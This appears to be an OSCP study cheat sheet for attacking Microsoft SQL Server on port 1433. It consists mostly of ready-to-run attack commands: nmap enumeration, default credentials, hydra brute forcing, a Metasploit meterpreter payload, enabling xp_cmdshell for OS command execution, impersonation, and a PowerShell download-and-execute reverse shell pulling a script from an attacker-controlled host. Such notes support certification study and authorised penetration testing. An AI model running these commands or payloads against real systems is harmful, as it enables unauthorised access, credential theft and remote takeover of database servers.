# MS SQL Server Enumeration (Port 1433)

**Source:** gabb4r/OSCP Notes Integration

## Quick Intro

- Microsoft SQL Server default port: 1433
- Uses SMB/MSSQL protocol for authentication
- Often integrated with Active Directory
- Vulnerable to weak authentication, SQL injection, privilege escalation

## Port Scanning

```bash
nmap -sV -p 1433 <target>
nmap -sV -p 1433 --script=ms-sql-info <target>
nmap -sV -p 1433 --script=ms-sql-empty-password <target>
nmap -sV -p 1433 --script=ms-sql-enumerate-accounts <target>
```

## Reconnaissance & Banner Grabbing

```bash
# Banner grab
nc -nv <IP> 1433

# MSSQL specific
python impacket/mssqlclient.py <user>:<password>@<IP>
```

## Default Credentials

- `sa:` (blank password - older versions)
- `sa:password`
- `admin:admin`
- `BUILTIN\ADMINISTRATORS` (domain auth)

## Connection Methods

### Impacket

```bash
mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<IP>
mssqlclient.py <user>:<password>@<IP>
```

### sqlcmd (Windows)

```cmd
sqlcmd -S <IP>,1433 -U <user> -P <password>
```

### Metasploit

```bash
use exploit/windows/mssql/mssql_payload
set PAYLOAD windows/meterpreter/reverse_tcp
```

## Enumerate via NMAP

```bash
nmap --script ms-sql-* -p 1433 <target>
nmap --script ms-sql-xp-cmdshell-info -p 1433 <target>
```

## Post-Connection Enumeration

```sql
-- Current user
SELECT USER_NAME();
SELECT SYSTEM_USER;

-- Database version
SELECT @@VERSION;

-- List databases
SELECT name FROM sys.databases;

-- List user accounts
SELECT * FROM sys.sysusers;

-- List roles
SELECT * FROM sys.sysroles;

-- Check permissions
EXEC sp_helprotect;
```

## Privilege Escalation

### Enable xp_cmdshell

```sql
-- Check if enabled
EXEC sp_configure 'xp_cmdshell';

-- Enable if disabled
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig';
```

### Reverse Shell via xp_cmdshell

```sql
-- Basic reverse shell
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<IP>:<PORT>/rev.ps1'')"';

-- Or directly
EXEC xp_cmdshell 'cmd /c powershell -c "IEX(...)"';
```

### Impersonation (if sysadmin)

```sql
-- Check sysadmin membership
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Impersonate other user (if sysadmin)
EXECUTE AS LOGIN = '<user>';
SELECT SYSTEM_USER;
```

## Brute Force Credentials

```bash
# hydra
hydra -l <user> -P rockyou.txt mssql://<IP>

# Impacket script
mssqlbrute.py <IP> -u wordlist.txt -p wordlist.txt
```

## Related Notes

- [[03-Enumeration/MySQL-Enumeration]] → MySQL enumeration
- [[03-Enumeration/Oracle-Enumeration]] → Oracle enumeration
- [[06-Exploitation/Bruteforce-Authentication]] → Credential attacks
- [[05-Post-Exploitation]] → Post-shell enumeration
